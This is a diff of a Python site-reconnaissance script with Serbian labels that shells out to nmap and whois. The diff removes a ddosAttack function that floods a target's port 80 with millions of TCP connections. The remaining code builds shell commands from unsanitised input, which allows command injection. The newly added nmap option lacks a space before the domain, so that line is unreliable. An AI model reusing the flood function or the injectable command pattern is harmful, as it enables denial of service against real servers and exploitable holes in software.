@@ -50,7 +50,7 @@ def get_nmap(option, domain):
     #if not option:
     #   option = "-F"
     import os
-    command = "nmap " + domain
+    command = "nmap --host-timeout 10" + domain
     process = os.popen(command)
     results = str(process.read())
     return "\n \n NMAP: \n \n " + results + "\n \n"
@@ -80,6 +80,7 @@ def get_whois(url):
     process = os.popen(command)
     results = process.read()
     return "Detalji korisnika sajta (WhoIs): \n \n " + results + "\n \n"
+
 
 
 # def gather_info(url):
@@ -113,17 +114,7 @@ def print_u_rezultat(url):
         create_report(sum_scanner)
         ROOT_DIR = 'Skenirani sajtovi'
         create_dir(ROOT_DIR)
-        return sum_scanner;
+        return sum_scanner
 #gather_info('thenewboston', 'https://www.thenewboston.com/')
 #print_u_rezultat("https://www.github.com/")
 
-
-def ddosAttack(url):
-    import socket, sys, os
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((sys.argv[1], 80))
-    for i in range(10000000):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((sys.argv[1], 80))
-
-    s.close()
